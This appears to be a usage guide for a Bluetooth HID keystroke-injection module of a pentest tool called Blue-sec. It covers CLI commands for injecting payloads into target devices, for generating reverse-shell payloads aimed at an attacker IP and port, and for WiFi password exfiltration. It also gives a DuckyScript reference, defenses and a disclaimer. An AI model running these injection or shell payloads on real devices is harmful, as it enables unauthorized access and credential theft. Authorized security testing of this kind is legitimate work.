# HID Attack Guide - Real-Time Testing on Real Devices

## Overview

Blue-sec's HID (Human Interface Device) attack module provides **BlueDucky-style** keyboard and mouse injection capabilities via Bluetooth. This allows you to perform **BadUSB/Rubber Ducky** style attacks wirelessly, similar to the BlueDucky project but with additional enterprise features.

## 🎯 Features

### Real-Time HID Attacks
- **Bluetooth HID Emulation** - Act as a wireless keyboard/mouse
- **DuckyScript Support** - Compatible with Rubber Ducky payload format
- **Interactive Mode** - Live testing with real-time command execution
- **Payload Library** - Pre-built payloads for common scenarios
- **Custom Payload Generator** - Create custom attack payloads
- **Cross-Platform** - Supports Windows, Linux, and macOS targets

### Safety Features
- User confirmation required for dangerous operations
- Audit logging of all HID attacks
- Rate limiting to prevent abuse
- Fail-safe mechanisms
- Test payloads for harmless demonstrations

---

## 🚀 Quick Start

### 1. Basic Test (Harmless)

Test keyboard injection with a harmless payload:

```bash
# Rickroll test (opens YouTube video)
sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF \
  --payload data/payloads/hid/rickroll_test.json

# Simple keyboard test
sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF \
  --payload data/payloads/hid/test_keyboard.json
```

### 2. Interactive Mode

Launch interactive testing session:

```bash
sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF --interactive
```

Available commands in interactive mode:
- `type <text>` - Type text on target device
- `key <key>` - Press a single key
- `combo <mod+key>` - Key combination (e.g., CTRL+C)
- `payload <file>` - Execute payload file
- `disconnect` - End session

### 3. Generate Custom Payloads

Create custom attack payloads:

```bash
# Reverse shell payload
sudo python3 blue-sec.py generate-payload \
  --name "My Reverse Shell" \
  --type reverse_shell \
  --os linux \
  --ip 192.168.1.100 \
  --port 4444 \
  --output my_payload.json

# Information gathering payload
sudo python3 blue-sec.py generate-payload \
  --name "System Info" \
  --type info_gather \
  --os windows \
  --output sysinfo.json
```

---

## 📋 Available Payloads

### Test Payloads (Harmless)

**1. test_keyboard.json**
- Opens Notepad and types test message
- Safe for demonstrations
- Verifies HID functionality

**2. rickroll_test.json**
- Opens Rick Astley's "Never Gonna Give You Up" on YouTube
- Harmless prank payload
- Good for testing without risks

### Information Gathering

**3. info_gather_windows.json**
- Gathers system information
- Collects IP configuration
- Lists network connections
- Enumerates user accounts
- Target: Windows

### Data Exfiltration

**4. wifi_exfil_windows.json**
- Extracts WiFi passwords
- Saves to file
- Target: Windows

### Reverse Shells

**5. reverse_shell_linux.json**
- Opens reverse shell on Linux
- Requires: Attacker IP/Port configuration
- Target: Linux

**6. reverse_shell_windows.json**
- PowerShell-based reverse shell
- Requires: Attacker IP/Port configuration
- Target: Windows

---

## 🔤 DuckyScript Reference

Blue-sec supports DuckyScript-compatible commands:

### Basic Commands

```
STRING <text>      Type text string
ENTER              Press Enter key
DELAY <ms>         Wait for milliseconds
TAB                Press Tab key
SPACE              Press Space key
BACKSPACE          Press Backspace
DELETE             Press Delete
ESC                Press Escape
```

### Special Keys

```
F1 - F12           Function keys
HOME               Home key
END                End key
PAGEUP             Page Up
PAGEDOWN           Page Down
UP/DOWN/LEFT/RIGHT Arrow keys
```

### Modifiers

```
CTRL <key>         Control + key
SHIFT <key>        Shift + key
ALT <key>          Alt + key
GUI <key>          Windows/Command + key
WINDOWS <key>      Same as GUI (Windows key)
COMMAND <key>      Same as GUI (macOS Command)
```

### Comments

```
REM <comment>      Comment (ignored)
// <comment>       Alternative comment syntax
```

---

## 📝 Creating Custom Payloads

### Payload JSON Format

```json
{
    "name": "My Custom Payload",
    "description": "Description of what this payload does",
    "target_os": "windows",
    "delay_ms": 100,
    "commands": [
        "REM This is a comment",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING notepad",
        "ENTER",
        "DELAY 1000",
        "STRING Hello from Blue-sec!"
    ]
}
```

### Payload Fields

- **name**: Descriptive name for the payload
- **description**: What the payload does
- **target_os**: `windows`, `linux`, `macos`, or `all`
- **delay_ms**: Default delay between commands (milliseconds)
- **commands**: Array of DuckyScript commands

### Example: Custom Windows Payload

```json
{
    "name": "Open Calculator",
    "description": "Opens Windows Calculator",
    "target_os": "windows",
    "delay_ms": 100,
    "commands": [
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING calc",
        "ENTER"
    ]
}
```

### Example: Custom Linux Payload

```json
{
    "name": "Terminal Test",
    "description": "Opens terminal and runs commands",
    "target_os": "linux",
    "delay_ms": 100,
    "commands": [
        "DELAY 1000",
        "CTRL ALT t",
        "DELAY 1500",
        "STRING echo 'Hello from Blue-sec'",
        "ENTER",
        "DELAY 500",
        "STRING date",
        "ENTER"
    ]
}
```

---

## 🛠️ Programmatic Usage

You can use Blue-sec's HID attack module programmatically:

```python
import asyncio
from modules import (
    HIDPayload, HIDKeyboardInjector, 
    RealTimeDeviceTester, PayloadGenerator
)
from modules.config import AttackConfig, SecurityConfig

async def main():
    # Initialize
    attack_config = AttackConfig()
    security_config = SecurityConfig()
    injector = HIDKeyboardInjector(attack_config, security_config)
    
    # Connect to device
    target = "AA:BB:CC:DD:EE:FF"
    connected = await injector.connect(target)
    
    if connected:
        # Create a simple payload
        payload = HIDPayload(
            name="Test",
            description="Simple test",
            commands=["STRING Hello World!", "ENTER"]
        )
        
        # Execute payload
        result = await injector.execute_payload(payload)
        print(f"Success: {result.success}")
        print(f"Commands executed: {result.commands_executed}")
        
        # Disconnect
        await injector.disconnect()

asyncio.run(main())
```

### Generate Payloads Programmatically

```python
from modules import PayloadGenerator

# Generate reverse shell
payload = PayloadGenerator.reverse_shell(
    ip="192.168.1.100",
    port=4444,
    os="linux"
)

# Save to file
import json
with open("my_shell.json", "w") as f:
    json.dump(payload.to_dict(), f, indent=4)
```

---

## 🎯 Attack Scenarios

### Scenario 1: Authorized Penetration Test

**Objective**: Test if users can be compromised via Bluetooth HID

**Steps**:
1. Obtain written authorization
2. Scan for vulnerable Bluetooth devices
3. Test with harmless payload first (rickroll)
4. Escalate to information gathering
5. Document findings
6. Report to client

```bash
# Step 1: Scan for devices
sudo python3 blue-sec.py scan

# Step 2: Test with harmless payload
sudo python3 blue-sec.py hid-test <target> \
  --payload data/payloads/hid/rickroll_test.json

# Step 3: Information gathering (if authorized)
sudo python3 blue-sec.py hid-test <target> \
  --payload data/payloads/hid/info_gather_windows.json
```

### Scenario 2: Security Awareness Training

**Objective**: Demonstrate Bluetooth security risks

**Steps**:
1. Set up controlled lab environment
2. Use test payloads only
3. Show how quickly attacks can happen
4. Educate on prevention

```bash
# Demonstrate with rickroll
sudo python3 blue-sec.py hid-test <lab-device> \
  --payload data/payloads/hid/rickroll_test.json

# Show keyboard injection
sudo python3 blue-sec.py hid-test <lab-device> \
  --payload data/payloads/hid/test_keyboard.json
```

### Scenario 3: Compliance Testing

**Objective**: Verify Bluetooth security controls

**Steps**:
1. Test Bluetooth pairing security
2. Verify HID profile restrictions
3. Test device authorization
4. Generate compliance report

---

## 🔒 Security Considerations

### Before Testing

✅ **Always**:
- Obtain written authorization
- Use in controlled environments
- Test on your own devices first
- Have a response plan ready
- Document everything

❌ **Never**:
- Test on unauthorized devices
- Use in public spaces without permission
- Deploy malicious payloads
- Share attack details publicly
- Ignore local laws and regulations

### Target Protections

Targets can protect against HID attacks by:
1. Disabling Bluetooth when not needed
2. Using Bluetooth device whitelisting
3. Requiring manual pairing confirmation
4. Implementing HID input filtering
5. Using endpoint detection and response (EDR)
6. Regular security awareness training

### Detection

HID attacks can be detected by:
- Unexpected keyboard/mouse activity
- Sudden application launches
- Audit log monitoring
- Bluetooth connection monitoring
- Behavioral analysis tools

---

## 🐛 Troubleshooting

### Connection Issues

**Problem**: Cannot connect to device

**Solutions**:
- Verify device is in pairing mode
- Check Bluetooth is enabled
- Verify target address is correct
- Ensure you have root/admin privileges
- Check Bluetooth adapter compatibility

### Payload Execution Issues

**Problem**: Payload doesn't execute correctly

**Solutions**:
- Verify target OS matches payload
- Increase delay values for slower systems
- Check keyboard layout compatibility
- Test with simple payload first
- Verify device is unlocked and active

### Permission Issues

**Problem**: Permission denied errors

**Solutions**:
- Run with sudo/administrator
- Check Bluetooth adapter permissions
- Verify user has necessary privileges
- Check SELinux/AppArmor policies

---

## 📚 Additional Resources

### References
- [BlueDucky Project](https://github.com/pentestfunctions/BlueDucky)
- [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky)
- [DuckyScript Documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [Bluetooth HID Profile Specification](https://www.bluetooth.com/specifications/specs/human-interface-device-profile-1-1-1/)

### Related Tools
- Rubber Ducky
- USB Rubber Ducky
- Bash Bunny
- LAN Turtle
- Packet Squirrel

---

## ⚠️ Legal Disclaimer

**This functionality is provided for authorized security testing only.**

Using HID attacks against systems you don't own or have explicit written permission to test is:
- **Illegal** in most jurisdictions
- **Unethical** and a breach of trust
- **Punishable** by law with severe penalties

Users are solely responsible for:
- Obtaining proper authorization
- Complying with all applicable laws
- Using responsibly and ethically
- Any consequences of misuse

The authors and contributors:
- Do NOT condone illegal use
- Are NOT liable for misuse
- Recommend responsible disclosure
- Encourage ethical security research

**USE AT YOUR OWN RISK. ALWAYS OBTAIN AUTHORIZATION.**
